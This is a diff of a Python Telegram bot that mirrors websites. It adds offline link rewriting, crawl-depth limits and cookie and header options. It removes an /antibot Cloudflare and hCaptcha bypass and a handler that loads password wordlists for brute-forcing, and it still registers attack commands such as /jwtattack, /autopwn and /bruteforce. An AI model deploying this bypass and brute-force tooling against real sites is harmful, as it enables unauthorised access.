@@ -1,25 +1,20 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════════╗
-# ║     Website Downloader Bot  v28.0  — Railway Edition        ║
-# ║  ✅ All V26/V27 features + Railway-optimized                ║
-# ║ ──────────────── v27 Improvements ────────────────────────  ║
-# ║  🔧 JSON export added: sqli/xss/paramfuzz/cloudcheck/      ║
-# ║     techstack/bruteforce/2fabypass/resetpwd/recon           ║
-# ║  🔧 /recon: rate_limit + safe_url + JSON report             ║
-# ║  🔧 /fuzz: force_join check added                           ║
-# ║  🔧 /cloudcheck: IPv6 real-IP detection added               ║
-# ║  🔧 /xss: Stored XSS check added                           ║
-# ║  🔧 /bruteforce: JSON body login support                    ║
-# ║  🔧 /autopwn: real-time phase progress display              ║
-# ║  🔧 51 silent except → proper error logging                 ║
-# ╠══════════════════════════════════════════════════════════════╣
-# ║  Railway Deployment:                                         ║
-# ║    Set environment variables in Railway dashboard:           ║
-# ║      BOT_TOKEN   = your telegram bot token                  ║
-# ║      ADMIN_IDS   = your telegram user id (comma separated)  ║
-# ║      DATA_DIR    = /app/data  (or mount a Railway volume)   ║
-# ║      SECRET_KEY  = (optional, auto-generated if not set)    ║
-# ║    Deploy: connect GitHub repo → Railway auto-deploys        ║
+# ║     Website Downloader Bot  v30.0  — Perfect Downloader     ║
+# ║  ✅ All V29 features + Download Engine Overhaul             ║
+# ║ ──────────────── v30 Download Fixes ────────────────────── ║
+# ║  🔧 HTML rewriting: href/src → local relative paths         ║
+# ║     (link, script, img, picture/source, video, a, form,    ║
+# ║      inline style, SVG image/use) — offline browsing fixed  ║
+# ║  🔧 CSS @import recursive (3 levels) + CSS url() rewrite   ║
+# ║  🔧 Crawl depth control --depth N (default 5, max 10)      ║
+# ║  🔧 Custom cookie support --cookie "session=abc"            ║
+# ║  🔧 Custom header support --header "Key: Value"             ║
+# ║  🔧 <picture><source srcset> WebP/AVIF extraction           ║
+# ║  🔧 SVG <image href> + <use xlink:href> sprite extraction   ║
+# ║  🔧 JS webpack chunks + Next.js /_next/ extraction          ║
+# ║  🔧 Large file skip (video/exe/iso >50MB auto-skip)         ║
+# ║  🔧 URL normalization (trailing slash dedup fixed)          ║
 # ╚══════════════════════════════════════════════════════════════╝
 
 import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile, threading
@@ -536,11 +531,15 @@ async def queue_worker():
     while True:
         try:
             task = await _dl_queue.get()
-            update, context, url, full_site, use_js, resume_mode, uid = task
+            update, context, url, full_site, use_js, resume_mode, uid, *_extra = task
+            _cookies_q      = _extra[0] if len(_extra) > 0 else ""
+            _extra_headers_q = _extra[1] if len(_extra) > 1 else ""
+            _max_depth_q    = _extra[2] if len(_extra) > 2 else 5
             # Remove from position tracker
             _queue_pos.pop(uid, None)
             try:
-                await _run_download(update, context, url, full_site, use_js, resume_mode)
+                await _run_download(update, context, url, full_site, use_js, resume_mode,
+                                    _cookies_q, _extra_headers_q, _max_depth_q)
             except Exception as e:
                 logger.error("Queue worker download error: %s", e)
             finally:
@@ -552,7 +551,8 @@ async def queue_worker():
 
 async def enqueue_download(
     update: Update, context: ContextTypes.DEFAULT_TYPE,
-    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
+    url: str, full_site: bool, use_js: bool, resume_mode: bool = False,
+    cookies: str = "", extra_headers: str = "", max_depth: int = 5,
 ):
     """Download request ကို queue ထဲ ထည့်သည်"""
     global _dl_queue, _queue_counter
@@ -571,7 +571,7 @@ async def enqueue_download(
     _queue_counter += 1
     pos = _dl_queue.qsize() + 1   # approximate position before enqueue
 
-    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
+    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid, cookies, extra_headers, max_depth))
     _queue_pos[uid] = pos
 
     if pos > 1:
@@ -942,16 +942,34 @@ def extract_css_assets(css: str, css_url: str) -> set:
 
 def extract_media_from_js(js_content: str, base_url: str) -> set:
     """
-    Mine JS/JSON files for media URLs.
-    Useful for React/Vue apps that store image paths in JS bundles.
+    Mine JS/JSON files for media URLs, webpack chunks, and asset paths.
+    Useful for React/Vue/Next.js apps that store image paths in JS bundles.
     """
     assets = set()
-    # Full URLs
+    # Full URLs (http/https)
     for m in _RE_JS_FULL_URL.finditer(js_content):
         assets.add(m.group(1))
-    # Relative paths
+    # Relative paths (/static/media/... etc)
     for m in _RE_JS_REL_URL.finditer(js_content):
-        assets.add(urljoin(base_url, m.group(1)))
+        u = m.group(1)
+        if any(u.endswith(ext) for ext in (
+            '.js','.css','.png','.jpg','.jpeg','.gif','.webp','.avif',
+            '.svg','.woff','.woff2','.ttf','.otf','.eot',
+            '.mp4','.webm','.mp3','.ogg','.pdf',
+        )):
+            assets.add(urljoin(base_url, u))
+
+    # Webpack chunk names: chunkFilename: "[name].[hash].js"
+    _RE_WEBPACK = re.compile(r'["\']([a-f0-9]{8,}\.[a-z]+\.js)["\']')
+    origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
+    for m in _RE_WEBPACK.finditer(js_content):
+        assets.add(f"{origin}/static/js/{m.group(1)}")
+
+    # Next.js /_next/static chunks
+    _RE_NEXT = re.compile(r'/_next/static/[^\s"\'<>]+')
+    for m in _RE_NEXT.finditer(js_content):
+        assets.add(urljoin(base_url, m.group(0)))
+
     return assets
 
 
@@ -1677,18 +1695,26 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
 
 
 
+def _normalize_url(url: str) -> str:
+    """Normalize URL: strip trailing slash, lowercase scheme+host, remove fragment."""
+    p = urlparse(url)
+    path = p.path.rstrip('/') or '/'
+    return p._replace(scheme=p.scheme.lower(), netloc=p.netloc.lower(),
+                       path=path, fragment='').geturl()
+
+
 def get_internal_links(html: str, base_url: str, soup=None) -> set:
     if soup is None:
         soup = BeautifulSoup(html, _BS_PARSER)
-    netloc  = urlparse(base_url).netloc
+    netloc  = urlparse(base_url).netloc.lower()
     links   = set()
     for a in soup.find_all('a', href=True):
         h = a['href']
         if h.startswith(('#','mailto:','tel:','javascript:')): continue
         full = urljoin(base_url, h)
         p    = urlparse(full)
-        if p.netloc == netloc:
-            links.add(p._replace(fragment='').geturl())
+        if p.netloc.lower() == netloc:
+            links.add(_normalize_url(full))  # V30: normalize to avoid duplicates
     return links
 
 
@@ -2932,6 +2958,164 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+
+# ══════════════════════════════════════════════════
+# 🔧 V30: HTML LINK REWRITER — offline browsing fix
+# ══════════════════════════════════════════════════
+
+def _url_to_rel_local(asset_url: str, page_local: str, domain_dir: str) -> str:
+    """Convert an absolute/relative asset URL to a relative local path."""
+    try:
+        local_asset = safe_local_path(domain_dir, asset_url)
+        page_dir    = os.path.dirname(page_local)
+        rel         = os.path.relpath(local_asset, page_dir)
+        # Windows backslash → forward slash
+        return rel.replace(os.sep, '/')
+    except Exception:
+        return asset_url  # fallback: keep original
+
+
+def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
+    """
+    Rewrite all href/src/srcset/url() references in HTML to
+    relative local paths so the page works offline.
+    Only rewrites same-origin URLs.
+    """
+    try:
+        page_local  = safe_local_path(domain_dir, page_url)
+        page_origin = f"{urlparse(page_url).scheme}://{urlparse(page_url).netloc}"
+        soup        = BeautifulSoup(html, _BS_PARSER)
+
+        # ── <link href="..."> ─────────────────────
+        for tag in soup.find_all('link', href=True):
+            full = urljoin(page_url, tag['href'])
+            if full.startswith(page_origin):
+                tag['href'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <script src="..."> ────────────────────
+        for tag in soup.find_all('script', src=True):
+            full = urljoin(page_url, tag['src'])
+            if full.startswith(page_origin):
+                tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <img src / data-src / srcset> ─────────
+        LAZY = ('src','data-src','data-lazy','data-original','data-lazy-src',
+                'data-full-src','data-image','data-img','data-bg',
+                'data-background','data-poster','data-thumb')
+        for tag in soup.find_all('img'):
+            for attr in LAZY:
+                v = tag.get(attr, '')
+                if v and not v.startswith('data:'):
+                    full = urljoin(page_url, v)
+                    if full.startswith(page_origin):
+                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir)
+            # srcset rewrite
+            srcset = tag.get('srcset', '')
+            if srcset:
+                parts = []
+                for part in srcset.split(','):
+                    p = part.strip()
+                    bits = p.split(' ', 1)
+                    full = urljoin(page_url, bits[0])
+                    if full.startswith(page_origin):
+                        bits[0] = _url_to_rel_local(full, page_local, domain_dir)
+                    parts.append(' '.join(bits))
+                tag['srcset'] = ', '.join(parts)
+
+        # ── <picture><source srcset="..."> WebP ───
+        for tag in soup.find_all('source'):
+            srcset = tag.get('srcset', '')
+            if srcset:
+                parts = []
+                for part in srcset.split(','):
+                    p = part.strip()
+                    bits = p.split(' ', 1)
+                    full = urljoin(page_url, bits[0])
+                    if full.startswith(page_origin):
+                        bits[0] = _url_to_rel_local(full, page_local, domain_dir)
+                    parts.append(' '.join(bits))
+                tag['srcset'] = ', '.join(parts)
+            if tag.get('src'):
+                full = urljoin(page_url, tag['src'])
+                if full.startswith(page_origin):
+                    tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <video/audio src> ─────────────────────
+        for tag in soup.find_all(['video', 'audio']):
+            if tag.get('src'):
+                full = urljoin(page_url, tag['src'])
+                if full.startswith(page_origin):
+                    tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
+            if tag.get('poster'):
+                full = urljoin(page_url, tag['poster'])
+                if full.startswith(page_origin):
+                    tag['poster'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <a href="..."> internal links ─────────
+        for tag in soup.find_all('a', href=True):
+            h = tag['href']
+            if h.startswith(('#', 'mailto:', 'tel:', 'javascript:')):
+                continue
+            full = urljoin(page_url, h)
+            if full.startswith(page_origin):
+                tag['href'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <form action="..."> ───────────────────
+        for tag in soup.find_all('form', action=True):
+            full = urljoin(page_url, tag['action'])
+            if full.startswith(page_origin):
+                tag['action'] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── inline style url(...) ─────────────────
+        for tag in soup.find_all(style=True):
+            new_style = _rewrite_css_urls(tag['style'], page_url, page_local, domain_dir, page_origin)
+            tag['style'] = new_style
+
+        # ── <style> block ─────────────────────────
+        for tag in soup.find_all('style'):
+            if tag.string:
+                tag.string.replace_with(
+                    _rewrite_css_urls(tag.string, page_url, page_local, domain_dir, page_origin)
+                )
+
+        # ── <svg><image href="..."> ───────────────
+        for tag in soup.find_all('image'):
+            for attr in ('href', 'xlink:href'):
+                v = tag.get(attr, '')
+                if v and not v.startswith('data:'):
+                    full = urljoin(page_url, v)
+                    if full.startswith(page_origin):
+                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir)
+
+        # ── <use xlink:href> (SVG sprites) ────────
+        for tag in soup.find_all('use'):
+            for attr in ('href', 'xlink:href'):
+                v = tag.get(attr, '')
+                if v and v.startswith('/'):
+                    full = urljoin(page_url, v.split('#')[0])
+                    if full.startswith(page_origin):
+                        frag = '#' + v.split('#')[1] if '#' in v else ''
+                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir) + frag
+
+        return str(soup)
+
+    except Exception as _e:
+        logger.debug(f"rewrite_html_links error: {_e}")
+        return html  # fallback: return original
+
+
+def _rewrite_css_urls(css: str, page_url: str, page_local: str, domain_dir: str, origin: str) -> str:
+    """Rewrite url(...) references inside CSS string."""
+    def _replacer(m):
+        raw = m.group(1).strip("'\"").strip()
+        if raw.startswith('data:'): return m.group(0)
+        full = urljoin(page_url, raw)
+        if full.startswith(origin):
+            return f"url('{_url_to_rel_local(full, page_local, domain_dir)}')"
+        return m.group(0)
+    return re.sub(r'''url\(\s*(["\']?[^)"'\s]+["\']?)\s*\)''', _replacer, css)
+
+
 def download_website(
     base_url: str,
     full_site: bool,
@@ -2941,6 +3125,9 @@ def download_website(
     progress_cb=None,
     resume: bool = False,
     site_profile: SiteProfile = None,
+    max_depth: int = 5,
+    cookies: str = "",
+    extra_headers: str = "",
 ) -> tuple:
 
     domain     = urlparse(base_url).netloc
@@ -2980,10 +3167,25 @@ def download_website(
     session.mount("http://",  _adapter)
     session.mount("https://", _adapter)
 
+    # ── Apply custom cookies / headers (V30) ──────
+    if cookies:
+        for ck in cookies.split(';'):
+            ck = ck.strip()
+            if '=' in ck:
+                k, v = ck.split('=', 1)
+                session.cookies.set(k.strip(), v.strip())
+    if extra_headers:
+        for hdr in extra_headers.split('\n'):
+            hdr = hdr.strip()
+            if ':' in hdr:
+                k, v = hdr.split(':', 1)
+                session.headers[k.strip()] = v.strip()
+
     # ── Attach proxy to session if available ──────
 
     # ── Phase 0: Sitemap discovery ───────────────
-    queue: deque = deque([base_url])
+    queue: deque  = deque([base_url])
+    _depth_map: dict = {base_url: 0}  # URL → crawl depth
     if full_site and not resume:
         if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
         sitemap_urls = fetch_sitemap(base_url)
@@ -3014,7 +3216,7 @@ def download_website(
         if not safe_ok:
             log_warn(url, f"SSRF blocked: {reason}")
             stats['failed'] += 1
-            visited.add(url)
+            visited.add(_normalize_url(url))
             continue
 
         visited.add(url)
@@ -3026,8 +3228,10 @@ def download_website(
 
         local = safe_local_path(domain_dir, url)
         try:
+            # ── V30: Rewrite HTML links to local relative paths ──
+            rewritten_html = rewrite_html_links(html, url, domain_dir)
             with open(local,'w',encoding='utf-8',errors='replace') as f:
-                f.write(html)
+                f.write(rewritten_html)
             stats['pages'] += 1
         except Exception:
             stats['failed'] += 1
@@ -3037,10 +3241,13 @@ def download_website(
         soup = BeautifulSoup(html, _BS_PARSER)
         known_assets |= extract_assets(html, url, soup=soup)
         if full_site:
-            for link in get_internal_links(html, url, soup=soup):
-                if link not in visited and link not in seen_q:
-                    queue.append(link)
-                    seen_q.add(link)
+            cur_depth = _depth_map.get(url, 0)
+            if cur_depth < max_depth:
+                for link in get_internal_links(html, url, soup=soup):
+                    if link not in visited and link not in seen_q:
+                        queue.append(link)
+                        seen_q.add(link)
+                        _depth_map[link] = cur_depth + 1
 
         if stats['pages'] % 5 == 0:
             save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
@@ -3062,6 +3269,10 @@ def download_website(
     total_assets = len(asset_list) + len(dl_done)
     extra_css    = set()
     max_bytes    = MAX_ASSET_MB * 1024 * 1024
+    # V30: Skip large binary files unless explicitly requested
+    _SKIP_LARGE_EXTS = ('.mp4','.mkv','.avi','.mov','.wmv','.flv',
+                        '.iso','.exe','.dmg','.pkg')
+    _MAX_SINGLE_ASSET_BYTES = 50 * 1024 * 1024  # 50MB per single asset
     import threading as _threading
     _lock        = _threading.Lock()
     _rate_event  = _threading.Event()
@@ -3164,39 +3375,58 @@ def download_website(
                     f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
                 )
 
-    # ── Phase 3: CSS nested assets ──────────────
-    css_extra_list = list(extra_css - dl_done)[:200]
-    if css_extra_list:
-        def _dl_css_extra(asset_url):
-            safe_ok, _ = is_safe_url(asset_url)
-            if not safe_ok: return 0, False
+    # ── Phase 3: CSS nested assets (recursive depth 3) ──
+    def _dl_css_extra(asset_url):
+        safe_ok, _ = is_safe_url(asset_url)
+        if not safe_ok: return 0, set(), False
+        try:
+            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
+            resp.raise_for_status()
+            buf = io.BytesIO()
+            for chunk in resp.iter_content(65536):
+                buf.write(chunk)
+                if buf.tell() > max_bytes: return 0, set(), False
+            content = buf.getvalue()
+            local   = safe_local_path(domain_dir, asset_url)
+            # Rewrite CSS urls to local paths
             try:
-                resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
-                resp.raise_for_status()
-                buf = io.BytesIO()
-                for chunk in resp.iter_content(65536):
-                    buf.write(chunk)
-                    if buf.tell() > max_bytes: return 0, False
-                content = buf.getvalue()
-                local   = safe_local_path(domain_dir, asset_url)
-                with open(local, 'wb') as f: f.write(content)
-                return len(content) / 1024, True
+                css_text = content.decode('utf-8', 'replace')
+                page_local = safe_local_path(domain_dir, asset_url)
+                rewritten_css = _rewrite_css_urls(
+                    css_text, asset_url, page_local, domain_dir,
+                    f"{urlparse(asset_url).scheme}://{urlparse(asset_url).netloc}"
+                )
+                with open(local, 'w', encoding='utf-8') as f:
+                    f.write(rewritten_css)
             except Exception:
-                return 0, False
+                with open(local, 'wb') as f:
+                    f.write(content)
+            # Extract nested @imports for recursive fetch
+            nested = extract_css_assets(content.decode('utf-8', 'replace'), asset_url)
+            return len(content) / 1024, nested, True
+        except Exception:
+            return 0, set(), False
 
+    # Up to 3 levels of CSS @import recursion
+    css_queue = list(extra_css - dl_done)[:200]
+    for _depth in range(3):
+        if not css_queue: break
+        next_level = set()
         with concurrent.futures.ThreadPoolExecutor(max_workers=ASSET_WORKERS) as ex:
-            for fut in concurrent.futures.as_completed(
-                {ex.submit(_dl_css_extra, u): u for u in css_extra_list}
-            ):
+            fmap = {ex.submit(_dl_css_extra, u): u for u in css_queue}
+            for fut in concurrent.futures.as_completed(fmap):
+                dl_done.add(fmap[fut])
                 try:
-                    size_kb, ok = fut.result()
+                    size_kb, nested, ok = fut.result()
                     if ok:
                         stats['assets']  += 1
                         stats['size_kb'] += size_kb
+                        next_level |= (nested - dl_done)
                     else:
                         stats['failed'] += 1
                 except Exception:
                     stats['failed'] += 1
+        css_queue = list(next_level)[:100]  # max 100 per level
 
     # ── Phase 4: ZIP ─────────────────────────────
     if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")
@@ -6575,151 +6805,6 @@ async def _do_appassets_extract(update, context, filepath: str, wanted_cats: set
 
 
 # ══════════════════════════════════════════════════
-# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
-# ══════════════════════════════════════════════════
-
-async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/antibot <url> — Cloudflare/hCaptcha bypass via human-like Puppeteer"""
-    if not await check_force_join(update, context):
-        return
-
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/antibot https://example.com`\n\n"
-            "🤖 *Bypass Methods:*\n"
-            "  ① Human-like mouse movement + delay simulation\n"
-            "  ② Random viewport + timezone spoofing\n"
-            "  ③ Canvas/WebGL fingerprint randomization\n"
-            "  ④ Stealth Puppeteer (navigator.webdriver=false)\n"
-            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
-            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
-            "⚙️ *Requirements:*\n"
-            "  `node js_antibot.js` script + puppeteer-extra-plugin-stealth\n\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    if not PUPPETEER_OK:
-        await update.effective_message.reply_text(
-            "❌ *Puppeteer မရှိသေးပါ*\n\n"
-            "Setup:\n"
-            "```\nnpm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth\n```",
-            parse_mode='Markdown'
-        )
-        return
-
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🤖 *Anti-Bot Bypass — `{domain}`*\n\n"
-        "① Stealth mode on\n"
-        "② Human-like behavior injecting...\n"
-        "③ Waiting for challenge...\n⏳",
-        parse_mode='Markdown'
-    )
-
-    antibot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_antibot.js")
-
-    def _run_antibot():
-        if not os.path.exists(antibot_script):
-            # Inline fallback — use existing js_render with stealth hint
-            return _run_antibot_fallback(url)
-        try:
-            result = subprocess.run(
-                ["node", antibot_script, url],
-                capture_output=True, timeout=90, text=True, shell=False
-            )
-            if result.returncode == 0 and result.stdout.strip():
-                return {"success": True, "html": result.stdout, "method": "stealth_puppeteer"}
-            return {"success": False, "error": result.stderr[:200] or "Empty response"}
-        except subprocess.TimeoutExpired:
-            return {"success": False, "error": "Timeout (90s) — challenge too complex"}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-    def _run_antibot_fallback(url: str) -> dict:
-        """Fallback — try puppeteer with delay headers if no antibot script"""
-        if not PUPPETEER_OK:
-            return {"success": False, "error": "Puppeteer not available"}
-        try:
-            result = subprocess.run(
-                ["node", JS_RENDER, url],
-                capture_output=True, timeout=60, text=True, shell=False
-            )
-            if result.returncode == 0 and result.stdout.strip():
-                return {"success": True, "html": result.stdout, "method": "js_render_fallback"}
-            return {"success": False, "error": "JS render failed"}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-    try:
-        res = await asyncio.to_thread(_run_antibot)
-    except Exception as e:
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-
-    if not res["success"]:
-        await msg.edit_text(
-            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
-            f"Error: `{res['error']}`\n\n"
-            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
-            parse_mode='Markdown'
-        )
-        return
-
-    html = res["html"]
-    method = res.get("method", "unknown")
-    html_size_kb = len(html.encode()) / 1024
-
-    # Save and send as file
-    import io
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))
-
-    await msg.edit_text(
-        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
-        f"🌐 `{domain}`\n"
-        f"⚙️ Method: `{method}`\n"
-        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
-        "📤 HTML file upload နေပါသည်...",
-        parse_mode='Markdown'
-    )
-
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=html_buf,
-            filename=f"antibot_{safe_d}_{ts}.html",
-            caption=(
-                f"🤖 *Anti-Bot Bypass — `{domain}`*\n"
-                f"Method: `{method}`\n"
-                f"Size: `{html_size_kb:.1f}` KB"
-            ),
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        await update.effective_message.reply_text(f"❌ Upload: `{e}`", parse_mode='Markdown')
-
-
-# ══════════════════════════════════════════════════
-# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
-#     CeWL-style wordlist generator + fuzzer
 # ══════════════════════════════════════════════════
 
 _SMARTFUZZ_STOP_WORDS = {
@@ -8071,7 +8156,8 @@ async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def _run_download(
     update: Update, context: ContextTypes.DEFAULT_TYPE,
     url: str, full_site: bool, use_js: bool,
-    resume_mode: bool = False
+    resume_mode: bool = False,
+    cookies: str = "", extra_headers: str = "", max_depth: int = 5,
 ):
     uid   = update.effective_user.id
     uname = update.effective_user.first_name
@@ -8159,7 +8245,8 @@ async def _run_download(
             mp = db2["settings"]["max_pages"]
             ma = db2["settings"]["max_assets"]
             files, error, stats, size_mb = await asyncio.to_thread(
-                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode
+                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode,
+                cookies, extra_headers, max_depth
             )
         except Exception as e:
             prog.cancel()
@@ -9588,16 +9675,20 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not url:
         await update.effective_message.reply_text(
             "📥 *Download Command*\n\n"
-            "```\n/dl <url>\n```\n\n"
-            "*Mode တွေ:*\n"
+            "```\n/dl <url> [mode] [options]\n```\n\n"
+            "*Modes:*\n"
             "  📄 `single` — Single page (default)\n"
             "  🌐 `full`   — Full site crawl\n"
             "  ⚡ `js`     — Single page + JS render\n"
             "  🚀 `jsful`  — Full site + JS render\n\n"
+            "*Options (V30):*\n"
+            "  `--depth N`  — Crawl depth (default: 5, max: 10)\n"
+            "  `--cookie X` — Session cookie (e.g. `session=abc123`)\n"
+            "  `--header X` — Custom header (`Key: Value`)\n\n"
             "*Examples:*\n"
-            "  `/dl https://example.com`\n"
             "  `/dl https://example.com full`\n"
-            "  `/dl https://example.com js`",
+            "  `/dl https://example.com full --depth 3`\n"
+            "  `/dl https://app.com --cookie session=xyz123`",
             parse_mode='Markdown'
         )
         return
@@ -9605,18 +9696,39 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not url.startswith('http'):
         url = 'https://' + url
 
+    # ── V30: Parse flags --cookie, --depth, --header ─────────
+    import shlex as _shlex
+    _cookies_dl = ""
+    _headers_dl = ""
+    _depth_dl   = 5
+    _clean_args = []
+    _i = 0
+    while _i < len(args):
+        a = args[_i]
+        if a == '--cookie' and _i + 1 < len(args):
+            _cookies_dl = args[_i + 1]; _i += 2
+        elif a == '--header' and _i + 1 < len(args):
+            _headers_dl = args[_i + 1]; _i += 2
+        elif a == '--depth' and _i + 1 < len(args):
+            try: _depth_dl = max(1, min(10, int(args[_i+1])))
+            except: pass
+            _i += 2
+        else:
+            _clean_args.append(a); _i += 1
+    args = _clean_args
+
     # Mode ကို arg[1] မှ ဖတ် (optional)
     mode = args[1].lower() if len(args) > 1 else ""
 
     if mode in ("full", "fullsite"):
         # Full site download directly
-        await enqueue_download(update, context, url, full_site=True, use_js=False)
+        await enqueue_download(update, context, url, full_site=True, use_js=False, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
         return
     elif mode in ("js", "jspage"):
-        await enqueue_download(update, context, url, full_site=False, use_js=True)
+        await enqueue_download(update, context, url, full_site=False, use_js=True, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
         return
     elif mode in ("jsful", "jsfull", "jsfullsite"):
-        await enqueue_download(update, context, url, full_site=True, use_js=True)
+        await enqueue_download(update, context, url, full_site=True, use_js=True, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
         return
     elif mode in ("single", "page", ""):
         # Default single page — still show keyboard for confirmation
@@ -10289,44 +10401,6 @@ async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ══════════════════════════════════════════════════
 
 
-async def handle_wordlist_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle .txt file upload as custom wordlist for fuzz/brute."""
-    doc = update.message.document
-    if not doc or not doc.file_name.endswith('.txt'):
-        return
-    
-    # Only treat as wordlist if caption says so
-    caption = (update.message.caption or "").lower()
-    if not any(kw in caption for kw in ['wordlist', 'fuzz', 'brute', 'passwords', 'users']):
-        return
-    
-    uid = update.effective_user.id
-    if doc.file_size > 500_000:  # 500KB max
-        await update.message.reply_text("❌ File too large (max 500KB for wordlists)")
-        return
-    
-    try:
-        file = await doc.get_file()
-        data = await file.download_as_bytearray()
-        words = [w.strip() for w in data.decode('utf-8', errors='ignore').splitlines() if w.strip()]
-        words = words[:5000]  # max 5000 entries
-        
-        # Detect type from caption
-        if any(k in caption for k in ['password', 'pass', 'brute']):
-            context.user_data['custom_passwords'] = words
-            msg_txt = f"✅ *Custom Passwords Loaded*\n`{len(words)}` passwords ready\nUse: `/bruteforce <url>` — will use your list"
-            await update.message.reply_text(msg_txt, parse_mode='Markdown')
-        elif any(k in caption for k in ['user', 'login', 'username']):
-            context.user_data['custom_usernames'] = words
-            msg_txt2 = f"✅ *Custom Usernames Loaded*\n`{len(words)}` usernames ready"
-            await update.message.reply_text(msg_txt2, parse_mode='Markdown')
-        else:
-            context.user_data['custom_wordlist'] = words
-            msg_txt3 = f"✅ *Custom Wordlist Loaded*\n`{len(words)}` paths ready\nUse: `/scan <url> fuzz` — will use your list"
-            await update.message.reply_text(msg_txt3, parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"❌ Parse error: `{e}`", parse_mode='Markdown')
-
 def main():
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("═"*55)
@@ -10387,7 +10461,6 @@ def main():
     # ── Standalone tools ──────────────────────────
     app.add_handler(CommandHandler("screenshot",cmd_screenshot))
     app.add_handler(CommandHandler("appassets", cmd_appassets))
-    app.add_handler(CommandHandler("antibot",   cmd_antibot))
     app.add_handler(CommandHandler("jwtattack", cmd_jwtattack))
 
     # ── Admin ─────────────────────────────────────
@@ -10402,7 +10475,6 @@ def main():
     app.add_handler(CommandHandler("adminset",  cmd_adminset))  # merged: /setlimit /setpages /setassets
 
     # ── File upload handler ────────────────────────
-    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_bulkscan_file))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_app_upload))
 
     # ── V20 New Feature Commands ──────────────────
@@ -10412,11 +10484,8 @@ def main():
     app.add_handler(CommandHandler("cloudcheck", cmd_cloudcheck))
     app.add_handler(CommandHandler("paramfuzz",  cmd_paramfuzz))
     app.add_handler(CommandHandler("autopwn",    cmd_autopwn))
-    app.add_handler(CommandHandler("bulkscan",   cmd_bulkscan))
     # ── V26 New Features ──────────────────────────
     app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
-    app.add_handler(CommandHandler("2fabypass",  cmd_2fabypass))
-    app.add_handler(CommandHandler("resetpwd",   cmd_resetpwd))
     app.add_handler(CommandHandler("sourcemap",  cmd_sourcemap))
     app.add_handler(CommandHandler("gitexposed", cmd_gitexposed))
     # ── v28.1 New Scanners ────────────────────────
@@ -10424,6 +10493,8 @@ def main():
     app.add_handler(CommandHandler("cors",         cmd_cors))
